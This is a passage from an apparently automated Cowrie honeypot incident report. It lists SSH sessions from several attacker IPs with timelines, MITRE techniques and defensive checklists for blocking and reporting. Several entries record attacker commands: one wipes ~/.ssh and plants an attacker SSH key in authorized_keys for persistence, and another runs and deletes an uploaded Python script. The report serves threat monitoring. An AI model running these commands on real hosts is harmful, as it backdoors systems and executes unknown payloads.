| `2026-06-29 14:55:09` | `cowrie.session.connect` |
| `2026-06-29 14:55:09` | `cowrie.client.version` |
| `2026-06-29 14:55:10` | `cowrie.client.kex` |
| `2026-06-29 14:55:10` | `cowrie.login.success` |
| `2026-06-29 14:55:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-550900131d34

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-06-29 14:55 |
| **Last Seen** | 2026-06-29 14:57 |
| **Session Duration** | 130s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 14:55:28` | `cowrie.session.connect` |
| `2026-06-29 14:55:28` | `cowrie.client.version` |
| `2026-06-29 14:55:28` | `cowrie.client.kex` |
| `2026-06-29 14:55:29` | `cowrie.login.success` |
| `2026-06-29 14:55:31` | `cowrie.session.file_upload` |
| `2026-06-29 14:55:32` | `cowrie.session.params` |
| `2026-06-29 14:55:32` | `cowrie.command.input` |
| `2026-06-29 14:55:32` | `cowrie.command.input` |
| `2026-06-29 14:55:32` | `cowrie.command.input` |
| `2026-06-29 14:55:32` | `cowrie.command.failed` |
| `2026-06-29 14:55:33` | `cowrie.log.closed` |
| `2026-06-29 14:55:33` | `cowrie.session.params` |
| `2026-06-29 14:55:33` | `cowrie.command.input` |
| `2026-06-29 14:55:34` | `cowrie.log.closed` |
| `2026-06-29 14:55:35` | `cowrie.session.params` |
| `2026-06-29 14:55:35` | `cowrie.command.input` |
| `2026-06-29 14:55:35` | `cowrie.log.closed` |
| `2026-06-29 14:55:36` | `cowrie.session.params` |
| `2026-06-29 14:55:36` | `cowrie.command.input` |
| `2026-06-29 14:55:36` | `cowrie.command.failed` |
| `2026-06-29 14:55:36` | `cowrie.command.failed` |
| `2026-06-29 14:56:37` | `cowrie.session.params` |
| `2026-06-29 14:56:37` | `cowrie.command.input` |
| `2026-06-29 14:57:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54a7074db1ed

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-29 14:57 |
| **Last Seen** | 2026-06-29 14:57 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 14:57:07` | `cowrie.session.connect` |
| `2026-06-29 14:57:10` | `cowrie.client.version` |
| `2026-06-29 14:57:10` | `cowrie.client.kex` |
| `2026-06-29 14:57:16` | `cowrie.login.success` |
| `2026-06-29 14:57:20` | `cowrie.session.params` |
| `2026-06-29 14:57:20` | `cowrie.command.input` |
| `2026-06-29 14:57:21` | `cowrie.log.closed` |
| `2026-06-29 14:57:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ece2f477e6a

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-06-29 14:57 |
| **Last Seen** | 2026-06-29 15:00 |
| **Session Duration** | 130s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 14:57:54` | `cowrie.session.connect` |
| `2026-06-29 14:57:54` | `cowrie.client.version` |
| `2026-06-29 14:57:54` | `cowrie.client.kex` |
| `2026-06-29 14:57:55` | `cowrie.login.success` |
| `2026-06-29 14:57:57` | `cowrie.session.file_upload` |
| `2026-06-29 14:57:58` | `cowrie.session.params` |
| `2026-06-29 14:57:58` | `cowrie.command.input` |
| `2026-06-29 14:57:58` | `cowrie.command.input` |
| `2026-06-29 14:57:58` | `cowrie.command.input` |
| `2026-06-29 14:57:58` | `cowrie.command.failed` |
| `2026-06-29 14:57:59` | `cowrie.log.closed` |
| `2026-06-29 14:58:00` | `cowrie.session.params` |
| `2026-06-29 14:58:00` | `cowrie.command.input` |
| `2026-06-29 14:58:00` | `cowrie.log.closed` |
| `2026-06-29 14:58:01` | `cowrie.session.params` |
| `2026-06-29 14:58:01` | `cowrie.command.input` |
| `2026-06-29 14:58:01` | `cowrie.log.closed` |
| `2026-06-29 14:58:02` | `cowrie.session.params` |
| `2026-06-29 14:58:02` | `cowrie.command.input` |
| `2026-06-29 14:58:02` | `cowrie.command.failed` |
| `2026-06-29 14:58:02` | `cowrie.command.failed` |
| `2026-06-29 14:59:04` | `cowrie.session.params` |
| `2026-06-29 14:59:04` | `cowrie.command.input` |
| `2026-06-29 15:00:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9abebebde428

| Field | Detail |
|---|---|
| **Source IP** | `186.96.158[.]180` |
| **First Seen** | 2026-06-29 14:58 |
| **Last Seen** | 2026-06-29 14:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 14:58:47` | `cowrie.session.connect` |
| `2026-06-29 14:58:47` | `cowrie.client.version` |
| `2026-06-29 14:58:47` | `cowrie.client.kex` |
| `2026-06-29 14:58:47` | `cowrie.login.success` |
| `2026-06-29 14:58:48` | `cowrie.session.params` |
| `2026-06-29 14:58:48` | `cowrie.command.input` |
| `2026-06-29 14:58:48` | `cowrie.command.failed` |
| `2026-06-29 14:58:48` | `cowrie.log.closed` |
| `2026-06-29 14:58:49` | `cowrie.session.params` |
| `2026-06-29 14:58:49` | `cowrie.command.input` |
| `2026-06-29 14:58:49` | `cowrie.session.file_download` |
| `2026-06-29 14:58:49` | `cowrie.log.closed` |
| `2026-06-29 14:58:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.96.158[.]180` to AbuseIPDB if not already reported
- [ ] Block `186.96.158[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-699e70a557b4

| Field | Detail |
|---|---|
| **Source IP** | `186.96.158[.]180` |
| **First Seen** | 2026-06-29 14:58 |
| **Last Seen** | 2026-06-29 14:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 14:58:49` | `cowrie.session.connect` |
| `2026-06-29 14:58:49` | `cowrie.client.version` |
| `2026-06-29 14:58:49` | `cowrie.client.kex` |
| `2026-06-29 14:58:49` | `cowrie.login.success` |
| `2026-06-29 14:58:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.96.158[.]180` to AbuseIPDB if not already reported
- [ ] Block `186.96.158[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c9415740b00

| Field | Detail |
|---|---|
| **Source IP** | `186.96.158[.]180` |
| **First Seen** | 2026-06-29 14:58 |
| **Last Seen** | 2026-06-29 14:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 14:58:50` | `cowrie.session.connect` |
| `2026-06-29 14:58:50` | `cowrie.client.version` |
| `2026-06-29 14:58:50` | `cowrie.client.kex` |
| `2026-06-29 14:58:50` | `cowrie.login.success` |
| `2026-06-29 14:58:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.96.158[.]180` to AbuseIPDB if not already reported
- [ ] Block `186.96.158[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f047a2d81aa

| Field | Detail |
|---|---|
| **Source IP** | `222.247.32[.]186` |
| **First Seen** | 2026-06-29 14:58 |
| **Last Seen** | 2026-06-29 15:03 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 14:58:50` | `cowrie.session.connect` |
| `2026-06-29 14:58:50` | `cowrie.client.version` |
| `2026-06-29 14:58:51` | `cowrie.client.kex` |
| `2026-06-29 14:58:52` | `cowrie.login.success` |
| `2026-06-29 14:58:53` | `cowrie.session.params` |
| `2026-06-29 14:58:53` | `cowrie.command.input` |
| `2026-06-29 14:58:53` | `cowrie.command.failed` |
| `2026-06-29 15:03:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.247.32[.]186` to AbuseIPDB if not already reported
- [ ] Block `222.247.32[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-008f61c0b60c

| Field | Detail |
|---|---|
| **Source IP** | `172.245.252[.]130` |
| **First Seen** | 2026-06-29 14:59 |
| **Last Seen** | 2026-06-29 14:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 14:59:06` | `cowrie.session.connect` |
| `2026-06-29 14:59:06` | `cowrie.client.version` |
| `2026-06-29 14:59:06` | `cowrie.client.kex` |
| `2026-06-29 14:59:06` | `cowrie.login.success` |
| `2026-06-29 14:59:07` | `cowrie.session.params` |
| `2026-06-29 14:59:07` | `cowrie.command.input` |
| `2026-06-29 14:59:07` | `cowrie.command.failed` |
| `2026-06-29 14:59:07` | `cowrie.log.closed` |
| `2026-06-29 14:59:08` | `cowrie.session.params` |
| `2026-06-29 14:59:08` | `cowrie.command.input` |
| `2026-06-29 14:59:08` | `cowrie.session.file_download` |
| `2026-06-29 14:59:08` | `cowrie.log.closed` |
| `2026-06-29 14:59:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.245.252[.]130` to AbuseIPDB if not already reported
- [ ] Block `172.245.252[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dac603610968

| Field | Detail |
|---|---|
| **Source IP** | `222.247.32[.]186` |
| **First Seen** | 2026-06-29 14:59 |
| **Last Seen** | 2026-06-29 15:03 |
| **Session Duration** | 273s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 14:59:08` | `cowrie.session.connect` |
| `2026-06-29 14:59:08` | `cowrie.client.version` |
| `2026-06-29 14:59:08` | `cowrie.client.kex` |
| `2026-06-29 14:59:10` | `cowrie.login.success` |
| `2026-06-29 15:03:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.247.32[.]186` to AbuseIPDB if not already reported
- [ ] Block `222.247.32[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b55b17b53767

| Field | Detail |
|---|---|
| **Source IP** | `172.245.252[.]130` |
| **First Seen** | 2026-06-29 14:59 |
| **Last Seen** | 2026-06-29 14:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 14:59:08` | `cowrie.session.connect` |
| `2026-06-29 14:59:08` | `cowrie.client.version` |
| `2026-06-29 14:59:08` | `cowrie.client.kex` |
| `2026-06-29 14:59:08` | `cowrie.login.success` |
| `2026-06-29 14:59:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.245.252[.]130` to AbuseIPDB if not already reported
- [ ] Block `172.245.252[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b22f9d6330c

| Field | Detail |
|---|---|
| **Source IP** | `172.245.252[.]130` |
| **First Seen** | 2026-06-29 14:59 |
| **Last Seen** | 2026-06-29 14:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 14:59:08` | `cowrie.session.connect` |
| `2026-06-29 14:59:08` | `cowrie.client.version` |
| `2026-06-29 14:59:08` | `cowrie.client.kex` |
| `2026-06-29 14:59:08` | `cowrie.login.success` |
| `2026-06-29 14:59:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.245.252[.]130` to AbuseIPDB if not already reported
- [ ] Block `172.245.252[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a4e3dbfb8f7

| Field | Detail |
|---|---|
| **Source IP** | `189.217.130[.]86` |
| **First Seen** | 2026-06-29 15:00 |
| **Last Seen** | 2026-06-29 15:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:00:17` | `cowrie.session.connect` |
| `2026-06-29 15:00:17` | `cowrie.client.version` |
| `2026-06-29 15:00:17` | `cowrie.client.kex` |
| `2026-06-29 15:00:17` | `cowrie.login.success` |
| `2026-06-29 15:00:18` | `cowrie.session.params` |
| `2026-06-29 15:00:18` | `cowrie.command.input` |
| `2026-06-29 15:00:18` | `cowrie.command.failed` |
| `2026-06-29 15:00:18` | `cowrie.log.closed` |
| `2026-06-29 15:00:19` | `cowrie.session.params` |
| `2026-06-29 15:00:19` | `cowrie.command.input` |
| `2026-06-29 15:00:19` | `cowrie.session.file_download` |
| `2026-06-29 15:00:19` | `cowrie.log.closed` |
| `2026-06-29 15:00:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.217.130[.]86` to AbuseIPDB if not already reported
- [ ] Block `189.217.130[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97c095dc8b27

| Field | Detail |
|---|---|
| **Source IP** | `189.217.130[.]86` |
| **First Seen** | 2026-06-29 15:00 |
| **Last Seen** | 2026-06-29 15:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:00:19` | `cowrie.session.connect` |
| `2026-06-29 15:00:19` | `cowrie.client.version` |
| `2026-06-29 15:00:19` | `cowrie.client.kex` |
| `2026-06-29 15:00:20` | `cowrie.login.success` |
| `2026-06-29 15:00:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.217.130[.]86` to AbuseIPDB if not already reported
- [ ] Block `189.217.130[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60f82dada285

| Field | Detail |
|---|---|
| **Source IP** | `189.217.130[.]86` |
| **First Seen** | 2026-06-29 15:00 |
| **Last Seen** | 2026-06-29 15:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:00:20` | `cowrie.session.connect` |
| `2026-06-29 15:00:20` | `cowrie.client.version` |
| `2026-06-29 15:00:20` | `cowrie.client.kex` |
| `2026-06-29 15:00:20` | `cowrie.login.success` |
| `2026-06-29 15:00:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.217.130[.]86` to AbuseIPDB if not already reported
- [ ] Block `189.217.130[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-550ed9da6c9d

| Field | Detail |
|---|---|
| **Source IP** | `35.195.110[.]198` |
| **First Seen** | 2026-06-29 15:02 |
| **Last Seen** | 2026-06-29 15:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:02:06` | `cowrie.session.connect` |
| `2026-06-29 15:02:06` | `cowrie.login.success` |
| `2026-06-29 15:02:06` | `cowrie.session.params` |
| `2026-06-29 15:02:06` | `cowrie.command.input` |
| `2026-06-29 15:02:06` | `cowrie.command.input` |
| `2026-06-29 15:02:06` | `cowrie.command.failed` |
| `2026-06-29 15:02:06` | `cowrie.command.input` |
| `2026-06-29 15:02:06` | `cowrie.log.closed` |
| `2026-06-29 15:02:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.195.110[.]198` to AbuseIPDB if not already reported
- [ ] Block `35.195.110[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a19b8593078

| Field | Detail |
|---|---|
| **Source IP** | `35.195.110[.]198` |
| **First Seen** | 2026-06-29 15:02 |
| **Last Seen** | 2026-06-29 15:02 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:02:14` | `cowrie.session.connect` |
| `2026-06-29 15:02:14` | `cowrie.login.success` |
| `2026-06-29 15:02:15` | `cowrie.session.params` |
| `2026-06-29 15:02:15` | `cowrie.command.input` |
| `2026-06-29 15:02:15` | `cowrie.command.failed` |
| `2026-06-29 15:02:32` | `cowrie.log.closed` |
| `2026-06-29 15:02:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.195.110[.]198` to AbuseIPDB if not already reported
- [ ] Block `35.195.110[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09f1651a3e5a

| Field | Detail |
|---|---|
| **Source IP** | `35.195.110[.]198` |
| **First Seen** | 2026-06-29 15:02 |
| **Last Seen** | 2026-06-29 15:02 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:02:16` | `cowrie.session.connect` |
| `2026-06-29 15:02:16` | `cowrie.login.success` |
| `2026-06-29 15:02:17` | `cowrie.session.params` |
| `2026-06-29 15:02:17` | `cowrie.command.input` |
| `2026-06-29 15:02:32` | `cowrie.log.closed` |
| `2026-06-29 15:02:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.195.110[.]198` to AbuseIPDB if not already reported
- [ ] Block `35.195.110[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae2ab4c4f1e8

| Field | Detail |
|---|---|
| **Source IP** | `50.6.228[.]111` |
| **First Seen** | 2026-06-29 15:03 |
| **Last Seen** | 2026-06-29 15:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:03:33` | `cowrie.session.connect` |
| `2026-06-29 15:03:33` | `cowrie.client.version` |
| `2026-06-29 15:03:33` | `cowrie.client.kex` |
| `2026-06-29 15:03:33` | `cowrie.login.success` |
| `2026-06-29 15:03:33` | `cowrie.session.params` |
| `2026-06-29 15:03:33` | `cowrie.command.input` |
| `2026-06-29 15:03:33` | `cowrie.command.failed` |
| `2026-06-29 15:03:33` | `cowrie.log.closed` |
| `2026-06-29 15:03:34` | `cowrie.session.params` |
| `2026-06-29 15:03:34` | `cowrie.command.input` |
| `2026-06-29 15:03:34` | `cowrie.session.file_download` |
| `2026-06-29 15:03:34` | `cowrie.log.closed` |
| `2026-06-29 15:03:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.228[.]111` to AbuseIPDB if not already reported
- [ ] Block `50.6.228[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a212dcc4bac

| Field | Detail |
|---|---|
| **Source IP** | `50.6.228[.]111` |
| **First Seen** | 2026-06-29 15:03 |
| **Last Seen** | 2026-06-29 15:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:03:34` | `cowrie.session.connect` |
| `2026-06-29 15:03:34` | `cowrie.client.version` |
| `2026-06-29 15:03:34` | `cowrie.client.kex` |
| `2026-06-29 15:03:34` | `cowrie.login.success` |
| `2026-06-29 15:03:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.228[.]111` to AbuseIPDB if not already reported
- [ ] Block `50.6.228[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0405c3810aea

| Field | Detail |
|---|---|
| **Source IP** | `50.6.228[.]111` |
| **First Seen** | 2026-06-29 15:03 |
| **Last Seen** | 2026-06-29 15:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:03:34` | `cowrie.session.connect` |
| `2026-06-29 15:03:34` | `cowrie.client.version` |
| `2026-06-29 15:03:34` | `cowrie.client.kex` |
| `2026-06-29 15:03:34` | `cowrie.login.success` |
| `2026-06-29 15:03:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.228[.]111` to AbuseIPDB if not already reported
- [ ] Block `50.6.228[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f98803737c0

| Field | Detail |
|---|---|
| **Source IP** | `200.219.200[.]16` |
| **First Seen** | 2026-06-29 15:04 |
| **Last Seen** | 2026-06-29 15:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
